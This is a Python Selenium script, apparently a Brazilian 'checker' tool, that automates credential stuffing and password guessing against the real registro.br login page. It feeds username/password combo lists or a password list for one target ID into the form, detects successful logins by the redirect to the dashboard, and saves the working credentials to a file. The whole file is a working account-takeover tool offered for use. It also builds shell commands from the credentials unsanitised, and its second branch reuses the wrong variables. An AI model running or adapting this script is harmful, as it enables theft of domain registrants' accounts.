#!/usr/share/python2
# -*- coding: utf-8 -*-
#
# Codado por B4l0x
#

from selenium import webdriver
import time
import os
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import argparse as arg


def banner():
    print('''
                                                                                             
                                ,,                                                           
`7MM"""Mq.                      db            mm                         `7MM"""Yp,          
  MM   `MM.                                   MM                           MM    Yb          
  MM   ,M9  .gP"Ya   .P"Ybmmm `7MM  ,pP"Ybd mmMMmm `7Mb,od8 ,pW"Wq.        MM    dP `7Mb,od8 
  MMmmdM9  ,M'   Yb :MI  I8     MM  8I   `"   MM     MM' "'6W'   `Wb       MM"""bg.   MM' "' 
  MM  YM.  8M""""""  WmmmP"     MM  `YMMMa.   MM     MM    8M     M8       MM    `Y   MM     
  MM   `Mb.YM.    , 8M          MM  L.   I8   MM     MM    YA.   ,A9       MM    ,9   MM     
.JMML. .JMM.`Mbmmd'  YMMMMMb  .JMML.M9mmmP'   `Mbmo.JMML.   `Ybmd9'      .JMMmmmd9  .JMML.   
                    6'     dP                                                                
                    Ybmmmd'                                                                  

           Codado por B4l0x - 13/12/2019 
	''')


banner()

parser = arg.ArgumentParser(description="Checker Registro.br")
parser.add_argument("--lista", "-w", help="Lista de logins", required=True, default="logins.txt", type=str)
parser.add_argument("--identificacao", "-id", help="ID Alvo", default="NULL", type=str)
x = parser.parse_args()

idd = x.identificacao

try:
    wordlist = open(x.lista, 'r').readlines()
except Exception as e:
    print("\nVerifique o caminho da wordlist e tente novamente...")
    exit()

firefox_options = Options()
firefox_options = webdriver.FirefoxOptions()
firefox_options.add_argument("--disable-logging")
firefox_options.add_argument("--ignore-certificate-errors")
firefox_options.add_argument("--no-default-browser-check")
firefox_options.add_argument("--log-level=3")
#firefox_options.add_argument('--headless')
# chrome_options.binary_location = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
driver = webdriver.Firefox(executable_path="geckodriver.exe", options=firefox_options)
#driver.implicitly_wait(300)

if idd == "NULL":
    for i in wordlist:
        dados = i.replace("\n", "")
        dados = dados.split("|")
        while True:
            driver.get('https://registro.br/login/')
            if len(i) >= 6:
                try:
                    driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/fieldset/div[1]/input').clear()
                    driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/fieldset/div[1]/input').send_keys(dados[0])
                    driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/fieldset/div[2]/input').send_keys(dados[2])
                    driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/button').click()
                    time.sleep(5)
                    
                    if(driver.current_url == "https://registro.br/painel/"):
                        print("Login => " + dados[0] + ":" + dados[2] + " [ LOGADO COM SUCESSO ]")
                        os.system('echo "' + dados[0] + ":" + dados[2] + '" >> registro-logado.txt')
                        time.sleep(3)
                        try:
                            driver.find_element_by_xpath('/html/body/div/header/div/div[2]/div[2]/ul/li[4]/a/span').click()
                        except:
                            pass
                            
                        time.sleep(45)
                        break
                    elif("senha incorreta" in driver.page_source):
                        print("Login => " + dados[0] + ":" + dados[2] + " [ SENHA INCORRETA ]")
                        time.sleep(45)
                        break           
                except Exception as e:
                    print("Erro preencher", e)
            else:
                pass
                
elif idd != "NULL":
    for i in wordlist:
        senha = i.replace("\n", "")
        driver.get('https://registro.br/login/')
        if len(i) >= 6:
            try:
                driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/fieldset/div[1]/input').clear()
                driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/fieldset/div[1]/input').send_keys(dados[0])
                driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/fieldset/div[2]/input').send_keys(dados[2])
                driver.find_element_by_xpath('/html/body/div/main/div/section/div/form/button').click()
                    
                time.sleep(5)
                if(driver.current_url == "https://registro.br/painel/"):
                    print("Login => " + idd + ":" + senha + " [ LOGADO COM SUCESSO ]")
                    os.system('echo "' + idd + ":" + senha + '" >> registro-logado.txt')
                    time.sleep(3)
                    try:
                        driver.find_element_by_xpath('/html/body/div/header/div/div[2]/div[2]/ul/li[4]/a/span').click()
                    except:
                        pass
                        
                    time.sleep(50)
                    break
                elif("senha incorreta" in driver.page_source):
                    print("Login => " + idd + ":" + senha + " [ SENHA INCORRETA ]")
                    time.sleep(50)
                    break
            except Exception as e:
                print("Erro preencher 2", e)
        else:
            pass
